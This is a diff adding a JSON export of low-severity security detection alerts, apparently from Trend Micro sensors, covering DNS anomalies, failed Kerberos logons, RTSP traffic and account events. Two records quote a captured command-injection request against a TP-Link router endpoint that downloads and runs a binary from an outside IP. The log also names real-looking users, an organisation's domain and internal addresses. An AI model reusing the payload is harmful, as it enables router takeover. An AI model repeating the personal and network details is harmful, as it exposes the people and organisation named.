@@ -1,0 +1,690 @@
+[
+    {
+        "detection_name": "Uncommon WMI Provider Path",
+        "severity_level": "low",
+        "description": "Uncommon WMI Provider Path",
+        "endpoint": "SVRWBKPB01",
+        "src_attack": null,
+        "shost": null,
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": null,
+        "objectCmd": null,
+        "detected_by": "751",
+        "uuid": "325cae1c-ccbc-4b4a-a00b-7192ed515083",
+        "dataHash": "37ece00782b517d406281bf19bdea406c29d1cb386700b0e24afde7b27698195"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.11.3.11",
+        "src_attack": [
+            "10.0.127.81"
+        ],
+        "shost": "10.0.127.81",
+        "dst_attack": [
+            "10.11.3.11"
+        ],
+        "dhost": "10.11.3.11",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "0000",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: marketplace-android-b406.hyprmx.com\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "9f184c47-d235-48b4-824d-b31c4f430ef7",
+        "dataHash": "b80a2c6b9947f29852e83b25517627c87f0880f8ecbcfd8be276200e9dabdc11"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.0.127.81",
+        "src_attack": [
+            "8.8.8.8"
+        ],
+        "shost": "dns.google",
+        "dst_attack": [
+            "10.0.127.81"
+        ],
+        "dhost": "10.0.127.81",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "0000",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: marketplace-android-b406.hyprmx.com\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "6c77e7e2-34b4-427c-9baa-a75833648f3e",
+        "dataHash": "5009948859a9ff52e0ff73ed543d780759d48f08c591648c1a04b19eb2e8499e"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.4.248.25",
+        "src_attack": [
+            "10.0.127.81"
+        ],
+        "shost": "10.0.127.81",
+        "dst_attack": [
+            "10.4.248.25"
+        ],
+        "dhost": "10.4.248.25",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "0000",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: marketplace-android-b406.hyprmx.com\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "1c2f7d55-fd0c-4de5-a0dc-f9c4e25ad848",
+        "dataHash": "7f8fa4a59f9256357bca6e25d23becca20f9300b7f2ff63aba04a9b14e9ef909"
+    },
+    {
+        "detection_name": "Disruptive Application Detection",
+        "severity_level": "low",
+        "description": "A disruptive application was detected.",
+        "endpoint": "10.0.127.83",
+        "src_attack": [
+            "10.9.3.216"
+        ],
+        "shost": "10.9.3.216",
+        "dst_attack": [
+            "10.0.127.83"
+        ],
+        "dhost": "10.0.127.83",
+        "request": null,
+        "rulename": null,
+        "app": "RTSP/RTP-TCP",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": null,
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "084408ed-9a43-484d-8dcd-35e7d9949860",
+        "dataHash": "e7db0f28f1510b83cda90000a030b7c56e6700edcffec9eea88b03ab8c5c7fb0"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.1.234.190",
+        "src_attack": [
+            "10.0.127.82"
+        ],
+        "shost": "10.0.127.82",
+        "dst_attack": [
+            "10.1.234.190"
+        ],
+        "dhost": "10.1.234.190",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: farm.plista.com\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "8ac1ffcb-bfe1-48d3-9ded-89c52fc733fd",
+        "dataHash": "c870894c5af7da63f96b12523c62eb1184a202c3a865c2f6a300ce7ecac2f3ee"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.37.124.5",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.37.124.5"
+        ],
+        "dhost": "10.37.124.5",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: VCDRC$\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "59acd6c1-e02e-4290-99c0-1cc04d9b4113",
+        "dataHash": "cdfc86d5c3e514e446d189d9ac5bf72e4ddf4ba64520b45661c5ff1eab84de35"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.0.127.81",
+        "src_attack": [
+            "1.1.1.1"
+        ],
+        "shost": "one.one.one.one",
+        "dst_attack": [
+            "10.0.127.81"
+        ],
+        "dhost": "10.0.127.81",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: ipv4.tracker.harry.lu\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "75f2337e-dfc9-4fa2-bdb0-5fe5164c3b57",
+        "dataHash": "d2d1d41f8f6d02c0ff26eea95a3f27eb8282d2934dc802472da64e766b76d243"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.0.127.82",
+        "src_attack": [
+            "1.1.1.1"
+        ],
+        "shost": "one.one.one.one",
+        "dst_attack": [
+            "10.0.127.82"
+        ],
+        "dhost": "10.0.127.82",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: ipv4.tracker.harry.lu\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "e42ac915-e967-4618-9ec5-720b70906848",
+        "dataHash": "b2f7d4bd3b310eaab506ad6c7bf1676dda511647da96c42a2a6af7d167a89636"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.7.3.26",
+        "src_attack": [
+            "10.0.127.81"
+        ],
+        "shost": "10.0.127.81",
+        "dst_attack": [
+            "10.7.3.26"
+        ],
+        "dhost": "10.7.3.26",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: ipv4.tracker.harry.lu\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "234dd599-1c63-4ed1-92d4-0f6a8121aa56",
+        "dataHash": "b1459ade0b0165307e0870455ed38f5d58ca8d253de1de111a5de0818a96432a"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.7.3.26",
+        "src_attack": [
+            "10.0.127.82"
+        ],
+        "shost": "10.0.127.82",
+        "dst_attack": [
+            "10.7.3.26"
+        ],
+        "dhost": "10.7.3.26",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: ipv4.tracker.harry.lu\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "7b109a84-c7fb-4a73-8bf0-38a7a9966166",
+        "dataHash": "00eef6edc231ff4b36fe94aad310276f0fe9598ef4820c2386587bd8437aa18a"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.2.15.142",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.2.15.142"
+        ],
+        "dhost": "10.2.15.142",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: 02tpr1912044psm$\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "5ed80a10-3e56-4974-8a17-0028085605cf",
+        "dataHash": "f6d880077bbd1b6e56e1c8fc7abdd6022adcb00b0ac14f94957d64e3400931cd"
+    },
+    {
+        "detection_name": "Command Injection Exploit Sensor HTTP (Request) Variant 2 - Inbound",
+        "severity_level": "low",
+        "description": "Network activity involving HTTP, which is associated with Exploit Command Injection, was detected.",
+        "endpoint": "10.0.10.13",
+        "src_attack": [
+            "84.54.51.41"
+        ],
+        "shost": "hosted-by.pfcloud.io",
+        "dst_attack": [
+            "10.0.10.13"
+        ],
+        "dhost": "10.0.10.13",
+        "request": "https://103.41.110.110:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Go-http-client/1.1",
+        "pAttackPhase": "Point of Entry",
+        "remarks": "[\"URL: https://103.41.110.110:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "876598ef-9c81-4a57-b03a-1f58148b91fc",
+        "dataHash": "dd3540bfbd24126e8fb2f6544f233b7beb202b2f5c00b41307a8a4fefcfafe40"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.2.6.57",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.2.6.57"
+        ],
+        "dhost": "10.2.6.57",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: 02tpr2305215pp3$\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "465d4ff4-79bb-4d0d-983f-201b3b5b2a55",
+        "dataHash": "5ed3e8807dfb0668a9c8f28fca8f6a40cf376f009b91aed4ae6ce6c52e18fade"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.32.3.32",
+        "src_attack": [
+            "10.0.127.81"
+        ],
+        "shost": "10.0.127.81",
+        "dst_attack": [
+            "10.32.3.32"
+        ],
+        "dhost": "10.32.3.32",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: farm.plista.com\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "a9c660be-fde4-4076-bccd-505f83e0330d",
+        "dataHash": "0917bcf5f7a3070d9a7f5ca790d68f4bdff2a80a11cc69ee7182c1135f8ae0da"
+    },
+    {
+        "detection_name": "Identified Privilege Escalation Attempt",
+        "severity_level": "low",
+        "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges.",
+        "endpoint": "svrlporadb51.sub11240637381.proddb01.oraclevcn.com",
+        "src_attack": null,
+        "shost": "svrlporadb51",
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "(to root) root on none",
+        "objectCmd": null,
+        "detected_by": "Server & Workload Protection",
+        "uuid": "b8844b72-50a8-4fbb-be55-635da608fa66",
+        "dataHash": "9df6750e9b12aa2099f77e6e41738b314456459bf979a7803188b57165da9ea6"
+    },
+    {
+        "detection_name": "Command Injection Exploit Sensor HTTP (Request) Variant 2 - Inbound",
+        "severity_level": "low",
+        "description": "Network activity involving HTTP, which is associated with Exploit Command Injection, was detected.",
+        "endpoint": "10.0.127.120",
+        "src_attack": [
+            "84.54.51.41"
+        ],
+        "shost": "hosted-by.pfcloud.io",
+        "dst_attack": [
+            "10.0.127.120"
+        ],
+        "dhost": "10.0.127.120",
+        "request": "https://103.41.110.59:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)",
+        "rulename": null,
+        "app": "HTTP",
+        "botUrl": null,
+        "userAgent": "Go-http-client/1.1",
+        "pAttackPhase": "Point of Entry",
+        "remarks": "[\"URL: https://103.41.110.59:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "562f1a89-0c2f-4fbf-b2b0-5d2b57fc732b",
+        "dataHash": "6eb30e98a2aafe868e508376156456d325dd1ac93cb41ea9433bec68cb4a0082"
+    },
+    {
+        "detection_name": "Disruptive Application Detection",
+        "severity_level": "low",
+        "description": "A disruptive application was detected.",
+        "endpoint": "10.0.127.83",
+        "src_attack": [
+            "10.9.3.215"
+        ],
+        "shost": "10.9.3.215",
+        "dst_attack": [
+            "10.0.127.83"
+        ],
+        "dhost": "10.0.127.83",
+        "request": null,
+        "rulename": null,
+        "app": "RTSP/RTP-TCP",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": null,
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "2df46ee9-cdaf-4d21-a19a-f6b8ca64b08a",
+        "dataHash": "89f0012fdb94d89be0e896cc4be63466e41dffbec6da71640e29582647b82810"
+    },
+    {
+        "detection_name": "Reset User Account Password Attempt",
+        "severity_level": "low",
+        "description": "Identifies the attempt to reset user password.",
+        "endpoint": "AD-01.inaport4.co.id",
+        "src_attack": null,
+        "shost": "AD-01",
+        "dst_attack": null,
+        "dhost": null,
+        "request": null,
+        "rulename": null,
+        "app": null,
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "WinEvtLog: Security: AUDIT_SUCCESS(4724): Microsoft-Windows-Security-Auditing: (no user): no domain: AD-01.inaport4.co.id: An attempt was made to reset an account's password. Subject:  Security ID:  S-1-5-21-1981852668-2328824844-4292568796-500  Account Name:  Administrator  Account Domain:  INAPORT4  Logon ID:  0x28f9e8c73  Target Account:  Security ID:  S-1-5-21-1981852668-2328824844-4292568796-5453  Account Name:  sheila.fajrin  Account Domain:  INAPORT4",
+        "objectCmd": null,
+        "detected_by": "Server & Workload Protection",
+        "uuid": "de7293a1-ee63-463f-8a99-2c61e7c0f039",
+        "dataHash": "432d88fdf1b5f85d8751b5cbe4347712bf03085598b643e76f85350a7eaeeadf"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.2.239.63",
+        "src_attack": [
+            "10.0.127.81"
+        ],
+        "shost": "10.0.127.81",
+        "dst_attack": [
+            "10.2.239.63"
+        ],
+        "dhost": "10.2.239.63",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: c.sayhi.360.cn\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "48c4de41-a656-4396-9bfe-f791d3214515",
+        "dataHash": "9083abbd9c5c28af1cbe834e91583bff38d52b4f887977865ee5b70b1ff0fc05"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.1.56.2",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.1.56.2"
+        ],
+        "dhost": "10.1.56.2",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: dirtekti-3092pc$\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "34c8117c-432e-4b21-8295-858612856a82",
+        "dataHash": "c15f64b98e3679275d646f2a8a73861ae3c083e820245f2847c2296a2edb5a44"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.5.0.81",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.5.0.81"
+        ],
+        "dhost": "10.5.0.81",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: 870904798\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "4daf1d66-8446-4a73-bad4-efc0d10213af",
+        "dataHash": "e3691fb82d95f59e5fe1f5f0b8e782e673cc7eebfe64169c19d23b2af776c56f"
+    },
+    {
+        "detection_name": "DNS response resolves to dead IP address",
+        "severity_level": "low",
+        "description": "Network activity involving DNS, where a response resolved to a dead or inactive IP address, was detected.",
+        "endpoint": "10.2.233.119",
+        "src_attack": [
+            "10.0.127.81"
+        ],
+        "shost": "10.0.127.81",
+        "dst_attack": [
+            "10.2.233.119"
+        ],
+        "dhost": "10.2.233.119",
+        "request": null,
+        "rulename": null,
+        "app": "DNS Response",
+        "botUrl": "7?01",
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": "[\"Domain: c.sayhi.360.cn\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "e601432b-ebb4-4bcf-9ef8-4f93862ada38",
+        "dataHash": "ef67120927ab356b24ddcff8d9bdd79374f661b980eb991998f926a6df6a4470"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.2.15.43",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.2.15.43"
+        ],
+        "dhost": "10.2.15.43",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: cctv$\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "e819d1f2-ebd7-4f8a-a7e6-acd50649e850",
+        "dataHash": "b1b4000556704291b7a3bb174778d3699f10f4abab98d962ec5ad6d61b5628a1"
+    },
+    {
+        "detection_name": "Disruptive Application Detection",
+        "severity_level": "low",
+        "description": "A disruptive application was detected.",
+        "endpoint": "10.0.127.83",
+        "src_attack": [
+            "10.18.3.47"
+        ],
+        "shost": "10.18.3.47",
+        "dst_attack": [
+            "10.0.127.83"
+        ],
+        "dhost": "10.0.127.83",
+        "request": null,
+        "rulename": null,
+        "app": "RTSP/RTP-TCP",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": null,
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "07fe83c4-eceb-4d1b-9986-4bbcbd0b38d0",
+        "dataHash": "7089f1bb74ce51df7165b8e60e6fdbc3fd943166fe082d740aab4108b311823b"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.12.3.28",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.12.3.28"
+        ],
+        "dhost": "10.12.3.28",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: Mochammad.Jacky\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "84bdacf6-ade1-46ef-8cec-2f7cb52bef85",
+        "dataHash": "b96070a8480374eb92cc7ae4dec1665973d822e28b9b6c359bd121b60f5f4da8"
+    },
+    {
+        "detection_name": "Disruptive Application Detection",
+        "severity_level": "low",
+        "description": "A disruptive application was detected.",
+        "endpoint": "10.0.127.83",
+        "src_attack": [
+            "10.4.12.57"
+        ],
+        "shost": "10.4.12.57",
+        "dst_attack": [
+            "10.0.127.83"
+        ],
+        "dhost": "10.0.127.83",
+        "request": null,
+        "rulename": null,
+        "app": "RTSP/RTP-TCP",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": null,
+        "remarks": null,
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "58663c7e-3fdf-4d91-80f2-ede3f485f1ab",
+        "dataHash": "2fb18f90dffa9d2a0893b7cc88f74ff41e110b2fd34afd340fa2429b6c9f1a8d"
+    },
+    {
+        "detection_name": "Unsuccessful Logon Attempt to Kerberos",
+        "severity_level": "low",
+        "description": "Unsuccessful Logon Attempt to Kerberos",
+        "endpoint": "10.4.27.82",
+        "src_attack": [
+            "10.0.127.220"
+        ],
+        "shost": "10.0.127.220",
+        "dst_attack": [
+            "10.4.27.82"
+        ],
+        "dhost": "10.4.27.82",
+        "request": null,
+        "rulename": null,
+        "app": "KERBEROS",
+        "botUrl": null,
+        "userAgent": null,
+        "pAttackPhase": "Lateral Movement",
+        "remarks": "[\"Username: 950505428\"]",
+        "objectCmd": null,
+        "detected_by": "Deep Discovery Inspector",
+        "uuid": "04a44605-2ab0-45ff-9a79-39286d591d5e",
+        "dataHash": "b611646e3566c35a15ac9cb0cbdc1fa0b3ca231ec451820bea89580ffde3081c"
+    }
+]
